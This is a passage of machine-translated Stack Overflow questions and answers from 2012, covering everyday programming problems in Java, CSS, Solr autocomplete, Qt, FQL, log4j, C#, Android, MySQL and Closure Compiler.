    at com.sun.enterprise.server.AbstractManager.load(AbstractManager.java:226)
    at com.sun.enterprise.server.ApplicationLifecycle.onStartup(ApplicationLifecycle.java:224)
    at com.sun.enterprise.server.ApplicationServer.onStartup(ApplicationServer.java:449)
    at com.sun.enterprise.server.ondemand.OnDemandServer.onStartup(OnDemandServer.java:134)
    at com.sun.enterprise.server.PEMain.run(PEMain.java:409)
    at com.sun.enterprise.server.PEMain.main(PEMain.java:336)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at com.sun.enterprise.server.PELaunch.main(PELaunch.java:415) 
```

在这里你也可以看到同样的问题`at org.hibernate.ejb.Ejb3Configuration.<clinit>(Ejb3Configuration.java:107)`

谁能**帮助**我为什么会出现这个错误。
这是非常需要的。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-01T08:55:02.353

问题解决了。
实际上`hibernate-annotations.jar`，服务器文件夹中的文件是不同版本的`lib`。
可能有人改变了它。现在它工作正常。

谢谢你。

# css - 如何在 td 单元格中垂直对齐图像，而无需垂直对齐

> ID：12215529
> 
> 赞同：1
> 
> 时间：2012-08-31T12:36:27.457
> 
> 标签：css, alignment, html-table, vertical-alignment

以下代码：

```
<div id="test">
  <table>
    <tbody>
      <tr>
        <td>
          <img src="img1.jpg" />
          <p>Bla bla bla</p>
          <p><a href="#"><img src="img2.jpg"></a></p>
        </td>
      </tr>
    </tbody>
  </table>
</div> 
```

和 CSS：

```
#test td {
    width: 450px;
    height: 220px;
    vertical-align: top;
    border-bottom: 1px solid #000;
    border-right: 50px solid #fff;
}

#test td p {
    margin: 0 0 10px 0;
    width: 290px;
}

#test img {
    padding: 20px 5px 5px 5px;
    float:left;
} 
```

如何将第二张图片与单元格底部的链接对齐？我在谷歌上搜索了很多，但没有一个解决方案对我有用......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:41:58.560

给出容器 ( `td`)`position: relative`和图像，或者更具体地说是`<p>`包含图像的容器，`position: absolute; bottom: 0;`。[在这里查看它的实际应用](http://jsfiddle.net/Zsgt8/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:39:16.863

尝试这个

```
<td valign="top">
          <img src="img1.jpg" />
          <p>Bla bla bla</p>
          <p><a href="#"><img src="img2.jpg"></a></p>
        </td> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:42:41.527

尝试这个：

```
<img src="img1.jpg" />
<p>Bla bla bla</p>
<div class="clearFloat"></div>
<p><a href="#"><img src="img2.jpg"></a></p> 
```

这个CSS：

```
#test td {
    width: 450px;
    height: 220px;
    vertical-align: top;
    border-bottom: 1px solid #000;
    border-right: 50px solid #fff;
}

#test td p {
    margin: 24px 0 0 0;
    width: 290px;
    float: left;
}

#test img {
    padding: 20px 5px 5px 5px;
    float:left;
}
.clearFloat {
    clear: both;
} 
```

演示：http: [//jsfiddle.net/maWJ2/](http://jsfiddle.net/maWJ2/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:43:23.273

`float:left;`从中删除`#test img`

```
#test img {
    padding: 20px 5px 5px 5px;
} 
```

参考**[现场演示](http://jsfiddle.net/SivaCharan/456Zz/)**

# windows - 如何让 Qt Creator 的 jom.exe 复制带有空格的路径中的文件？

> ID：12215535
> 
> 赞同：2
> 
> 时间：2012-08-31T12:36:38.830
> 
> 标签：windows, qt, makefile, copy, qt-creator

当我把我的`.pro`文件

```
INSTALLS += INSTALL
INSTALL.files += install/**
INSTALL.path = bin 
```

该`jom.exe install`命令尝试使用绝对路径复制文件

```
copy /y c:\Some Project\install\QtGui4.dll c:\Some Project\bin 
```

这失败了

> 参数个数无效

更好的命令是引用路径

```
copy /y "c:\Some Project\install\QtGui4.dll" "c:\Some Project\bin" 
```

成功了。如何让 jom.exe 引用绝对路径或使用相对路径？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T17:52:22.657

QMake 不能很好地处理路径中的空格。在使用包含空格的源或构建目录时，迟早总会遇到问题。以我的经验，与这些问题作斗争是徒劳的。我强烈建议 QMake 用户将所有源代码放入没有空格的路径中。

# search - 为建议性/预测性自动完成搜索配置 Solr

> ID：12215537
> 
> 赞同：5
> 
> 时间：2012-08-31T12:37:04.617
> 
> 标签：search, solr, lucene, search-suggestion

我们正在努力将 Solr 3.6 集成到电子商务网站。我们已经对数据进行了索引，并且搜索性能非常好。

我们在弄清楚如何使用预测搜索/自动完成搜索建议时遇到了一些困难。也有兴趣了解实现此功能的最佳实践。

我们的目标是提供类似于[http://www.amazon.com/](http://www.amazon.com/)的预测搜索，但不知道如何使用 Solr 实现它。更具体地说，我想了解如何从 Solr 构建这些术语，还是由 solr 外部的其他东西管理？应该如何构建词典来提供这些建议？此外，对于某些领域，搜索应该提供类别搜索。尝试在亚马逊搜索框中输入“xper”，你会发现除了xperia、xperia s、xperia p，它还列出了手机和配件中的xperia s，这是一个类别。

使用自定义字典这将很难管理。或者我们可能不知道如何正确地做到这一点。期待您指导我们如何最好地利用 solr 来实现这种暗示性搜索。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T12:51:14.790

我建议你写几篇博文：

*   [这个](http://www.cominvent.com/2012/01/25/super-flexible-autocomplete-with-solr/)向您展示了一个非常好的完整解决方案，该解决方案运行良好，但需要进行一些额外的工作，并为该特定目的使用特定的 lucene 索引（solr 核心）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-28T18:36:12.823

我使用了 Highlight 方法，因为 facet.prefix 一个对于大索引来说太重了，而其他的文档很少或不清楚（我是一个愚蠢的程序员）

所以让我们假设用户刚刚输入了“ `aaa bbb ccc`”

我们的自动完成功能（java/javascript）将使用以下参数调用 solr

```
q="aaa bbb"~100 ...base query, all the typed words except the last
fq=ccc* ...suggest word filter using last typed word
hl=true
hl.q=ccc* ...highlight word will be the one to suggest
fl=NONE ...return empty docs in result tag
hl.pre=### ...escape chars to locate highlight word in the response
hl.post=### ...see above 
```

您还可以使用 ' `rows`' 和 ' `hl.fragsize`' 参数控制建议的数量

每个文档中突出显示的单词将是带有“ `aaa bbb`”字符串的建议的正确候选者

更多建议词是高亮词之前/之后的词，当然，您可以实施更多过滤器来提取有效词，避免重复，限制建议

如果有兴趣我可以给你一些例子...

**已编辑：**有关该方法的一些进一步细节

我给出的示例部分假设 jquery 给出的“自动完成”机制：我们在 Web 应用程序中调用一个 jsp（或一个 servlet），将用户刚刚键入的单词作为请求参数“q”传递。

这是jsp的代码

```
ByteArrayInputStream is=null; // Used to manage Solr response
try{

  StringBuffer queryUrl=new StringBuffer('putHereTheUrlOfSolrServer');
  queryUrl.append("/select?wt=xml");
  String typedWords=request.getParameter("q");
  String base="";
  if(typedWords.indexOf(" ")<=0) {
    // No space typed by user: the 'easy case'
    queryUrl.append("&q=text:");
    queryUrl.append(URLEncoder.encode(typedWords+"*", "UTF-8"));
    queryUrl.append("&hl.q=text:"+URLEncoder.encode(typedWords+"*", "UTF-8"));
   } else {
    // Space chars present
    // we split the search in base phrase and last typed word
    base=typedWords.substring(0,typedWords.lastIndexOf(" "));
    queryUrl.append("&q=text:");
    if(base.indexOf(" ")>0)
        queryUrl.append("\""+URLEncoder.encode(base, "UTF-8")+"\"~1000");
    else
        queryUrl.append(URLEncoder.encode(base, "UTF-8"));

    typedWords=typedWords.substring(typedWords.lastIndexOf(" ")+1);
    queryUrl.append("&fq=text:"+URLEncoder.encode(typedWords+"*", "UTF-8"));
    queryUrl.append("&hl.q=text:"+URLEncoder.encode(typedWords+"*", "UTF-8"));
}

  // The additional parameters to control the solr response
  queryUrl.append("&rows="+suggestPageSize); // Number of results returned, a parameter to control the number of suggestions
  queryUrl.append("&fl=A_FIELD_NAME_THAT_DOES_NOT_EXIST"); // Interested only in highlights section, Solr return a 'light' answer
  queryUrl.append("&start=0"); // Use only first page of results
  queryUrl.append("&hl=true"); // Enable highlights feature
  queryUrl.append("&hl.simple.pre=***"); // Use *** as 'highlight border'
  queryUrl.append("&hl.simple.post=***"); // Use *** as 'highlight border'
  queryUrl.append("&hl.fragsize="+suggestFragSize); // Another parameter to control the number of suggestions
  queryUrl.append("&hl.fl=content,title"); // Look for result only in some fields
  queryUrl.append("&facet=false"); // Disable facets

  /* Omitted section: use a new URL(queryUrl.toString()) to get the solr response inside a byte array */

  is=new ByteArrayInputStream(solrResponseByteArray);

  DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
  DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
  Document doc = dBuilder.parse(is);
  XPathFactory xPathfactory = XPathFactory.newInstance();
  XPath xpath = xPathfactory.newXPath();
  XPathExpression expr = xpath.compile("//response/lst[@name=\"highlighting\"]/lst/arr[@name=\"content\"]/str");
  NodeList valueList = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);

  Vector<String> suggestions=new Vector<String>();
  for (int j = 0; j < valueList.getLength(); ++j) {
     Element value = (Element) valueList.item(j);
     String[] result=value.getTextContent().split("\\*\\*\\*");
     for(int k=0;k<result.length;k++){
        String suggestedWord=result[k].toLowerCase();
        if((k%2)!=0){
             //Highlighted words management
             if(suggestedWord.length()>=suggestedWord.length() && !suggestions.contains(suggestedWord))
                 suggestions.add(suggestedWord);
        }else{
            /* Words before/after highlighted words
               we can put these words inside another vector
               and use them if not enough suggestions */
        }
     }
  }

  /* Finally we build a Json Answer to be managed by our jquery function */
  out.print(request.getParameter("json.wrf")+"({ \"suggestions\" : [");
  boolean firstSugg=true;       
  for(String suggestionW:suggestions) {
    out.print((firstSugg?" ":" ,"));
    out.print("{ \"suggest\" : \"");
    if(base.length()>0) {
        out.print(base);
        out.print(" ");
    }
    out.print(suggestionW+"\" }");
    firstSugg=false;
  }
  out.print(" ]})");
}catch (Exception x) {
  System.err.println("Exception during main process: " + x);
  x.printStackTrace();
}finally{
  //Gracefully close streams//
  try{is.close();}catch(Exception x){;}
} 
```

希望对您有所帮助，尼克

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-30T12:16:26.093

这可能会帮助你。我正在尝试做同样的事情。

[http://solr.pl/en/2010/10/18/solr-and-autocomplete-part-1/](http://solr.pl/en/2010/10/18/solr-and-autocomplete-part-1/)

# facebook-graph-api - 使用 location_post 表获取正确的 FQL 查询

> ID：12215543
> 
> 赞同：0
> 
> 时间：2012-08-31T12:37:28.937
> 
> 标签：facebook-graph-api, facebook-fql

我正在尝试获取特定位置附近的所有帖子。我在我的 FB 页面上发布了一些带有位置的雕像和照片。在 Graph API Explorer 中，我运行以下查询：

```
SELECT id, coords, type, page_id, timestamp FROM location_post WHERE author_uid = me() 
```

它以正确的方式产生，但是当我添加时：

```
SELECT id, coords, type, page_id, timestamp FROM location_post WHERE author_uid = me() AND distance(latitude, longitude, '47', '122') < 10000 
```

然后所有结果都清除了。

我试图在查询中获取距离，它得到了很好的数字，比如 33 或 454。那么为什么 WHERE 部分中的距离函数没有结果呢？

还从示例请求：

```
SELECT id, page_id
FROM location_post
WHERE distance(latitude, longitude, '37.86564', '-122.25061') < 10000 
```

不显示任何东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-01T13:39:18.870

对于示例查询，您的纬度/经度报告在加利福尼亚州奥克兰以外的某处。要返回数据，您需要以下条件之一：

*   如果您`user_location`在访问令牌中请求许可，则您需要在距该点 10 公里（~6.25 英里）范围内发布或被标记。
*   如果您`friends_location`在访问令牌中请求许可，则需要您的朋友发布此帖子。

# java - 使用 Log4j 使用相同的记录器登录到不同的文件

> ID：12215544
> 
> 赞同：0
> 
> 时间：2012-08-31T12:37:35.647
> 
> 标签：java, log4j

我有一个类“Example.class”。我得到我的记录器：

```
 private final Logger log = Logger.getLogger(Example.class); 
```

我的 log4j.properties 看起来像：

```
 log4j.appender.file=org.apache.log4j.RollingFileAppender
    log4j.appender.file.File=log.txt

    log4j.appender.file.MaxFileSize=1024KB
    log4j.appender.file.MaxBackupIndex=5

    log4j.appender.file.layout=org.apache.log4j.PatternLayout
    log4j.appender.file.layout.ConversionPattern=%p %t %c - %m%n 
```

我的班级正在通过 log.info(..)、log.debug(..) 等记录到文件**log.txt**中。

现在我想为同一类使用不同的记录器，例如：

```
 private final Logger differentLogger = Logger.getLogger(Example.class); 
```

这个记录器应该登录到一个不同的文件，例如

```
 differentLogger.info("Hello World");
    //writes 'Hello World' into differentLogFile.txt 
```

这有可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:40:43.197

不，类别标识记录器。

也就是说，您不必强制使用类作为类别。你可以在同一个类中使用：

```
private final Logger log = Logger.getLogger(Example.class);

private final Logger differentLogger = Logger.getLogger(mylogs.different); 
```

之后，您可以在配置文件中定义多个附加程序并将每个类别分配给不同的附加程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:41:50.947

调用`Logger.getLogger(Example.class)`两次将返回相同或无法区分的`Logger`. 这意味着 Log4J 无法对它们进行任何区分，并且它们将始终位于同一个文件中。

解决方案很明显：使用不同的记录器！

```
Logger differentLogger = Logger.getLogger("differentLogger"); 
```

并配置`log4j.xml`为使用不同的附加程序`differentLogger`。

# c# - 为什么 `w("hi")` 不起作用但 `this.w("hi")` 起作用？

> ID：12215546
> 
> 赞同：1
> 
> 时间：2012-08-31T12:37:44.490
> 
> 标签：c#, c#-4.0, razor

> **可能重复：**
> [为什么从扩展类中调用扩展方法需要“this”关键字](https://stackoverflow.com/questions/3510964/why-is-the-this-keyword-required-to-call-an-extension-method-from-within-the-e)

我想本地化我的 MVC 应用程序，然后我想使用方法，并且[在这里](https://stackoverflow.com/questions/12204410/global-functions-in-razor-view-engine)`w(message)`回答“flem” ，我有以下代码：

```
namespace System.Web.WebPages
{
    public static class Localization
    {
        public static string w(this WebPageBase page, string message)
        {
            return message;
        }
    }
} 
```

但在 razor page( `page.cshtml`) 中我不能使用`@w("hi")`但`@this.w("hi")`可以工作。**我想知道它是如何`this.method()`工作但`method()`不起作用的？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:41:32.587

要调用静态方法，您必须指定该方法属于哪个类。

在您的情况下，因为这是一个扩展方法，所以`this`是指类型为 的当前页面`WebPageBase`。所以`this.w("hi")`实际上和你写的一样：

```
@WebPageBase.w("hi") 
```

...相当于：

```
@Localization.w(this, "hi") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:42:20.857

`w`是一种扩展方法，它们的工作方式是您调用它的对象被放置在`this`方法签名中指定的参数的位置。

如果`this.w`您正在指定它应该处理的对象。

如果你只是打电话`w("")`，那么你没有指定第一个参数。

我假设您在想，如果它是该对象的方法，那么这两个调用将是相同的，这是真的。但是，不同之处在于，范围内没有方法只是`w`. 该方法在另一个类中，它唯一的扩展方法的魔力允许它在正确的情况下工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:42:37.377

您已经为 WebPageBase 创建了一个扩展方法。
应该使用对象 WebPageBase 或派生对象来调用它。
在您的情况下`this`是要使用的正确对象（可能是 Page 对象）

[http://msdn.microsoft.com/en-us/library/bb383977.aspx](http://msdn.microsoft.com/en-us/library/bb383977.aspx)

# java - 如何访问在java android中扩展simpleOnGestureListener的内部类中的变量？

> ID：12215549
> 
> 赞同：0
> 
> 时间：2012-08-31T12:37:50.607
> 
> 标签：java, android

```
public class MyActivity extends MapActivity implements LocationListener, OnClickListener {

    private MapView mapView;
    private MyItemizedOverlay itemizedOverlay;
    Button route;
    boolean shadow;
    private LocationManager locManager;

    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        route = (Button) findViewById(R.id.cmd_submit);
        route.setOnClickListener(this);

        //fetch the map view from the layout
        mapView = (MapView) findViewById(R.id.myMapView);

        //make available zoom controls
        mapView.setBuiltInZoomControls(true);

        //latitude and longitude of Rome
        double lat = 41.889882;
        double lon = 12.479267;

        //create geo point
        GeoPoint point = new GeoPoint((int) (lat * 1E6), (int) (lon * 1E6));

        //get the MapController object
        MapController controller = mapView.getController();

        //animate to the desired point
        controller.animateTo(point);

        //set the map zoom to 13
        // zoom 1 is top world view
        controller.setZoom(13);

        //invalidate the map in order to show changes
        mapView.invalidate();

        // Use the location manager through GPS
        locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0,
                0, this);

        //get the current location (last known location) from the location manager
        Location location = locManager
                .getLastKnownLocation(LocationManager.GPS_PROVIDER);

        //if location found display as a toast the current latitude and longitude
        if (location != null) {

            Toast.makeText(
                    this,
                    "Current location:\nLatitude: " + location.getLatitude()
                    + "\n" + "Longitude: " + location.getLongitude(),
                    Toast.LENGTH_LONG).show();

            point = new GeoPoint((int) (location.getLatitude() * 1E6), (int) (location.getLongitude()
                    * 1E6));

            controller.animateTo(point);

        } else {

            Toast.makeText(this, "Cannot fetch current location!",
                    Toast.LENGTH_LONG).show();
        }

        //when the current location is found – stop listening for updates (preserves battery)
        locManager.removeUpdates(this);

        // fetch the drawable - the pin that will be displayed on the map
        Drawable drawable = this.getResources().getDrawable(R.drawable.marker);

        // create and add an OverlayItem to the MyItemizedOverlay list
        OverlayItem overlayItem = new OverlayItem(point, "", "");

        itemizedOverlay = new MyItemizedOverlay(drawable, this);

        itemizedOverlay.setGestureDetector(new GestureDetector(new MyGestureDetector()));

        itemizedOverlay.addOverlay(overlayItem);

        // add the overlays to the map
        mapView.getOverlays().add(itemizedOverlay);
        mapView.invalidate();

        //when the current location is found – stop listening for updates (preserves battery)
        locManager.removeUpdates(this);
    }

    @Override
    protected boolean isRouteDisplayed() {
        return false;

    }

    /* When the activity starts up, request updates */
    @Override
    protected void onResume() {
        super.onResume();
        locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0,
                0, this);
    }

    @Override
    protected void onPause() {
        super.onPause();
        locManager.removeUpdates(this); //activity pauses => stop listening for updates
    }
} 
```

这是内部类，问题是我想访问 MyActivity 类中的这个 ArrayList 点，但似乎我必须将所有变量设为静态，这最终会给我带来错误。任何解决方法或解决方案将不胜感激。

```
public class MyGestureDetector extends SimpleOnGestureListener {

    ArrayList<GeoPoint> points = new ArrayList<GeoPoint>();

    @Override
    public boolean onSingleTapConfirmed(MotionEvent event) {

        // fetch the correspondent point from the map

        Log.d("A condition", "d5al l methodaaya");
        GeoPoint p = mapView.getProjection().fromPixels((int) event.getX(), (int) event.getY());
        points.add(p);

        // create an overlay item and clear all others
        OverlayItem o = new OverlayItem(p, null, null);
        itemizedOverlay.addOverlay(o);

        if (points.size() > 1) {
            Log.d("Points are", "" + points);

        }

        // add the overlay item
        //mapView.getOverlays().clear();
        mapView.getOverlays().add(itemizedOverlay);
        mapView.invalidate();

        Geocoder geoCoder = new Geocoder(getBaseContext(),
                Locale.getDefault());

        // get the address based on the coordinates
        try {
            List<Address> addresses = geoCoder.getFromLocation(p.getLatitudeE6() / 1E6, p.getLongitudeE6()
                    / 1E6, 1);

            String addressString = "";
            if (addresses.size() > 0) {
                for (int i = 0; i < addresses.get(0)
                        .getMaxAddressLineIndex(); i++)
                    addressString += addresses.get(0).getAddressLine(i)
                            + " - ";
            }

            Toast.makeText(getBaseContext(), addressString,
                    Toast.LENGTH_SHORT).show();

        } catch (IOException e) {
            e.printStackTrace();
        }

        return true;
    }

    @Override
    public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
            float velocityY) {
        return super.onFling(e1, e2, velocityX, velocityY);
    }

    @Override
    public boolean onDown(MotionEvent e) {
        return false;
    }
}

public void onClick(View arg0) {

    //System.out.println(points);
    if (route == arg0) {
        Intent i = new Intent(this, ChoosingClues.class);
        startActivity(i);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:41:18.530

您可以将点声明为活动类的字段，然后您将可以访问这两个类。否则你不能在外部类中访问内部类的字段/变量。您只能访问类的静态字段。

所以将您的代码更改为以下内容：

```
public class MyActivity extends MapActivity implements LocationListener, OnClickListener {

    private MapView mapView;
    private MyItemizedOverlay itemizedOverlay;
    Button route;
    boolean shadow;
    private LocationManager locManager;
    ArrayList<GeoPoint> points = new ArrayList<GeoPoint>();

    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        route = (Button) findViewById(R.id.cmd_submit);
        route.setOnClickListener(this);

        //fetch the map view from the layout
        mapView = (MapView) findViewById(R.id.myMapView);

        //make available zoom controls
        mapView.setBuiltInZoomControls(true);

        //latitude and longitude of Rome
        double lat = 41.889882;
        double lon = 12.479267;

        //create geo point
        GeoPoint point = new GeoPoint((int) (lat * 1E6), (int) (lon * 1E6));

        //get the MapController object
        MapController controller = mapView.getController();

        //animate to the desired point
        controller.animateTo(point);

        //set the map zoom to 13
        // zoom 1 is top world view
        controller.setZoom(13);

        //invalidate the map in order to show changes
        mapView.invalidate();

        // Use the location manager through GPS
        locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0,
                0, this);

        //get the current location (last known location) from the location manager
        Location location = locManager
                .getLastKnownLocation(LocationManager.GPS_PROVIDER);

        //if location found display as a toast the current latitude and longitude
        if (location != null) {

            Toast.makeText(
                    this,
                    "Current location:\nLatitude: " + location.getLatitude()
                    + "\n" + "Longitude: " + location.getLongitude(),
                    Toast.LENGTH_LONG).show();

            point = new GeoPoint((int) (location.getLatitude() * 1E6), (int) (location.getLongitude()
                    * 1E6));

            controller.animateTo(point);

        } else {

            Toast.makeText(this, "Cannot fetch current location!",
                    Toast.LENGTH_LONG).show();
        }

        //when the current location is found – stop listening for updates (preserves battery)
        locManager.removeUpdates(this);

        // fetch the drawable - the pin that will be displayed on the map
        Drawable drawable = this.getResources().getDrawable(R.drawable.marker);

        // create and add an OverlayItem to the MyItemizedOverlay list
        OverlayItem overlayItem = new OverlayItem(point, "", "");

        itemizedOverlay = new MyItemizedOverlay(drawable, this);

        itemizedOverlay.setGestureDetector(new GestureDetector(new MyGestureDetector()));

        itemizedOverlay.addOverlay(overlayItem);

        // add the overlays to the map
        mapView.getOverlays().add(itemizedOverlay);
        mapView.invalidate();

        //when the current location is found – stop listening for updates (preserves battery)
        locManager.removeUpdates(this);
    }

    @Override
    protected boolean isRouteDisplayed() {
        return false;

    }

    /* When the activity starts up, request updates */
    @Override
    protected void onResume() {
        super.onResume();
        locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0,
                0, this);
    }

    @Override
    protected void onPause() {
        super.onPause();
        locManager.removeUpdates(this); //activity pauses => stop listening for updates
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:41:41.603

创建内部类的实例时，请保留对它的引用：

```
MyGestureDetector dectector = new MyGestureDetector();
itemizedOverlay.setGestureDetector(new GestureDetector(detector));

ArrayList<GeoPoint> points = detector.points; 
```

# mysql - Mysql IN 语句只查找列表中的第一个元素

> ID：12215550
> 
> 赞同：0
> 
> 时间：2012-08-31T12:37:52.963
> 
> 标签：mysql, sql

我有一个名为的表`table`，其中一行`table`有一个带有如下值的列：`6,7,8,9`

我想选择这一行，这是我希望工作的代码：

`SELECT * FROM table WHERE 8 IN (column)`

它不起作用。然而，有效的代码让我感到困惑：

`SELECT * FROM table WHERE 6 IN (column)`

我尝试了几个值，发现只有列表的第一个元素有效。

怎么会这样？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:41:49.390

因为您正在将数字与字符串进行比较。`6,7,8,9`cast to number 将是`6`，所以它会在 do 时为真`6 IN (column)`。

您需要使用`FIND_IN_SET`功能：

```
SELECT * FROM `table` WHERE FIND_IN_SET(8, `column`); 
```

# c# - 如果我想使用 FileStream 选择一个文件并进行复制，应该使用什么 FileMode？

> ID：12215551
> 
> 赞同：0
> 
> 时间：2012-08-31T12:37:53.663
> 
> 标签：c#, .net, filestream

假设有一个功能

```
public void UploadSomewhere(FileStream fs) 
```

如果我使用 FileStream 不足以指向文件路径，我还需要选择，`FileMode`如果您只是复制/移动文件，我不确定什么是正确的 FileMode。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:46:36.233

*如果*你想使用 FileStream 你可以简单地使用**Open**作为源文件。

例如，

```
var fs = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read); 
```

对于*目标*文件，您必须决定如果它存在会发生什么：

**如果您拥有**写入**权限，则**Create将允许您覆盖现有文件。****

 ****如果文件存在， CreateNew**将抛出。同样，您需要**写入**权限。

但是，正如其他人所写的，您可以完全跳过 FileStream 并使用 File 命令。

参考：http: [//msdn.microsoft.com/en-us/library/system.io.filemode.aspx](http://msdn.microsoft.com/en-us/library/system.io.filemode.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:40:39.433

如果您只是在**处理/移动**文件，并且您已经知道路径（据我从问题中了解到的），那么您根本不需要`FieStream`。`File.Move`使用或`File.Copy`功能就足够了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:40:26.257

请参阅[http://msdn.microsoft.com/en-us/library/system.io.filemode.aspx](http://msdn.microsoft.com/en-us/library/system.io.filemode.aspx)

如果您只需要阅读文件，我建议`FileMode.Open`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:42:08.003

如果您要复制文件`FileMode.Open`和`FileAccess.Read`.

如果您想在此过程中共享对文件的访问权限，请同时指定该`FileShare`选项。

查看[MSDN](http://msdn.microsoft.com/en-us/library/system.io.fileshare)以获取更多信息。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:42:13.413

如果您想使用 FileStream 复制文件，下面的示例应该为您指明正确的方法。

```
using (FileStream sourceFile = new FileStream("c:\\pathToSourceFile", FileMode.Open,FileAccess.Read))
{
    using (FileStream destFile = new FileStream("c:\\pathToDestinationFile", FileMode.Create))
    {
        int bufferSize = 65536;
        int bytesRead = -1;
        byte[] bytes = new byte[bufferSize];

        while ((bytesRead = sourceFile.Read(bytes, 0, bufferSize)) > 0)
        {
            destFile.Write(bytes, 0, bytesRead);
        }

    }
} 
```**

# javascript - 闭包编译器 --debug 解决了我的 bug

> ID：12215558
> 
> 赞同：2
> 
> 时间：2012-08-31T12:38:27.643
> 
> 标签：javascript, google-closure-compiler

因此，调试似乎有了新的意义，至少在 Closure Compiler 中是这样。

我有一个相当大的代码库，隔离问题是一项艰巨的任务。在我的入口点类中，我实例化了依赖项。其中之一，未正确创建，对象存在，但未调用其构造函数。

这只发生在高级模式下，所以我尝试传递 --debug 标志，瞧，错误消失了，构造函数被调用。真是令人兴奋。我不能复制粘贴任何特定的代码，你有什么建议？

```
/**
 * @param {Element} parent
 * @param {Object}  opts
 * @constructor
 */
ns.App = function(parent, opts) {
    this.options = new ns.Options(opts || {});

    var w = this.options.width || parent.offsetWidth;
    var h = this.options.height || parent.offsetHeight;
    this.view = new ns.AppView(w, h);
    this.history = new ns.CommandManager();

    // ....

    // this one doesn't get called
    this.amx_ = new ns.ActivityManager(this, this.options);
    // this one does
    this.output_ = new ns.Writer();
    this.bind_();
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:51:09.657

使用闭包编译器，当调试标志使错误消失时，通常表明您有重命名冲突。这可能是由于在外部定义的对象上设置属性而导致的，该对象的属性未完全定义给编译器。编译器将您的属性重命名为与现有属性相同的名称。

这也可能是由于使用点分语法 ( `obj.prop`) 引用属性而导致的，该属性是使用带引号的语法 ( `obj['prop']`) 声明的。根据定义，编译器将这些视为不同的属性。

确保打开`--warning_level VERBOSE`以帮助识别访问未定义的属性。尽管您的特定案例仍有可能无法识别。

# java - 如何获取 JDBC 查询的执行/获取时间？

> ID：12215564
> 
> 赞同：4
> 
> 时间：2012-08-31T12:39:03.930
> 
> 标签：java, database, performance, jdbc, time

[DbVisualizer](http://www.dbvis.com)之类的工具通常会在执行数据库查询后显示 exec/fetch 时间。通过 JDBC 执行查询后是否可以访问此类性能指标？

```
ResultSet rs = stmt.executeQuery("SELECT a, b, c FROM TABLE2");
ResultSetMetaData rsmd = rs.getMetaData();

// missing functionality:
float executionTime = rsmd.getExecTime();
float fetchTime = rsmd.getFetchTime(); 
```

我没有在`ResultSet`或`ResultSetMetaData`类中找到任何此类性能测量功能。没有比使用系统时钟“手动”测量经过时间更好的方法，例如[如何计算 java 中事件的经过时间？](https://stackoverflow.com/questions/238920/how-do-i-calculate-the-elapsed-time-of-an-event-in-java)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:57:28.007

你必须测量时间。通常，您会以**毫秒为单位**计时，`System.currentTimeMillis()`或者使用`System.nanoTime()`更高的分辨率/准确度。

当它很少使用时，自动计时将是一种浪费。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:20:20.853

Sormula ORM 可以记录时间信息。

```
description=SELECT id, firstName, lastName, graduationDate FROM Student WHERE id IN (?, ?)
prepare    = 50% 00:00:00.000382423 n=  1 avg=00:00:00.000382423
write      =  7% 00:00:00.000054496 n=  1 avg=00:00:00.000054496
execute    = 25% 00:00:00.000190143 n=  1 avg=00:00:00.000190143
read       = 19% 00:00:00.000144009 n=  2 avg=00:00:00.000072005
total      =100% 00:00:00.000771071 
```

请参阅[时序示例](http://sormula.org/timing/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-13T07:02:46.900

